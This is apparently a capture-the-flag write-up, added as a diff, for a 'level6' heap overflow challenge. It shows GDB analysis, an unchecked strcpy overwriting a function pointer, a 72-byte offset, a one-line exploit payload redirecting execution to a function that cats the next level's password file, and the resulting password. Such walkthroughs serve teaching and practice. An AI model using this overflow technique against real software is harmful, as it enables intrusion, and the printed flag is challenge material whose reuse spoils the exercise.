@@ -1,0 +1,79 @@
+# Level6 - Heap Overflow
+
+---
+
+# Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./level6
+Segmentation fault (core dumped)
+
+./level6 hello
+Nope
+```
+
+Program takes an argument.
+
+## Step 2: Analyze with GDB
+
+```bash
+gdb level6
+(gdb) info functions
+```
+
+Found: `n` (not called), `m` (called), `main`.
+
+## Step 3: Check function `n`
+
+```bash
+(gdb) disas n
+(gdb) x/s 0x80485b0
+"/bin/cat /home/user/level7/.pass"
+```
+
+`n` prints the password. Address: `0x08048454`
+
+## Step 4: Check function `m`
+
+```bash
+(gdb) disas m
+```
+
+`m` prints "Nope". Address: `0x08048468`
+
+## Step 5: Analyze main
+
+```bash
+(gdb) disas main
+```
+
+Key lines:
+
+```asm
+malloc(64)              ; First block for input
+malloc(4)               ; Second block for function pointer
+mov $0x8048468,%edx     ; Stores address of m()
+strcpy(block1, argv[1]) ; Copies input (NO SIZE CHECK!)
+call *%eax              ; Calls function pointer
+```
+
+## Step 6: Find the offset
+
+```bash
+(gdb) run $(python -c 'print "A"*72 + "BBBB"')
+0x42424242 in ?? ()
+```
+
+Offset: **72 bytes**
+
+## Step 7: Build the exploit
+
+```bash
+./level6 $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
+```
+
+**Password:** `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
+---
